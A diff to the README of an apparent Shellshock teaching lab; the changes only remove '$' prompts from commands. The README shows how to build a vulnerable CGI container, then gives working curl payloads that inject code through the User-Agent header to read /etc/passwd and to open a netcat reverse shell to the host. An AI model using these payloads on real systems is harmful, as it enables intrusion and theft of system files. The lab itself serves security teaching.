@@ -26,20 +26,20 @@ Prerequisites:
 ### Build and run docker container
 1. clone this git repository 
 ```bash 
-$ git clone https://github.com/juuugee/docker-shellshock-cgi.git 
+git clone https://github.com/juuugee/docker-shellshock-cgi.git 
  ```
 2. navigate inside the cloned directory
 ```bash 
-$ cd docker-shellshock-cgi/
+cd docker-shellshock-cgi/
  ```
 
 3. build docker container: 
 ``` bash
-$ docker build -t seccode/shellshock .
+docker build -t seccode/shellshock .
 ```
 4. run docker container: 
 ``` bash
-$ docker run -itd -p 80:80 --privileged --add-host=host.docker.internal:host-gateway --name secode_shellshock seccode/shellshock /sbin/init
+docker run -itd -p 80:80 --privileged --add-host=host.docker.internal:host-gateway --name secode_shellshock seccode/shellshock /sbin/init
 ``` 
 To make sure that the docker container is running, enter the following url in a browser: 
 
@@ -52,7 +52,7 @@ To make sure that the docker container is running, enter the following url in a 
 With the curl command, send a request to the webserver of the running docker container. 
 In this example, the file **etc/passwd** can be accessed and directly printed out:
 ```bash
-$ curl -A "() { :;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
+curl -A "() { :;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
 ```
 
 In the command above, the expression *() { :;};* is a empty function which should be parsed into a envrionment variable. Instead of stopping the parsing process the addtional code is being executed, which accessses the **etc/passwd** file and prints it with the **/bin/cat** tool in our console.
@@ -61,14 +61,14 @@ In the command above, the expression *() { :;};* is a empty function which shoul
 in the second attack a reverse shell is being created. 
 1. start netcat listener on the host computer:
 ```    
-$ nc -lp 4545
+nc -lp 4545
 ```
 This listener waits for the docker container to connect to it.     
 
 2. Establish a connection:
 In a second terminal send the request below to the webserver in the docker container. This leads to a reverse shell.
 ```
-$ curl -A "() { :;}; /bin/bash -c \"nc host.docker.internal 4545 -e /bin/bash\"& " http://localhost:80/cgi-bin/test.cgi
+curl -A "() { :;}; /bin/bash -c \"nc host.docker.internal 4545 -e /bin/bash\"& " http://localhost:80/cgi-bin/test.cgi
 ```
 
 After executing this command the netcat listener in the first termimal should display an incoming connection. Now it is possible to enter commands in this terminal which then are directly executed in the docker container. Below are some examples:
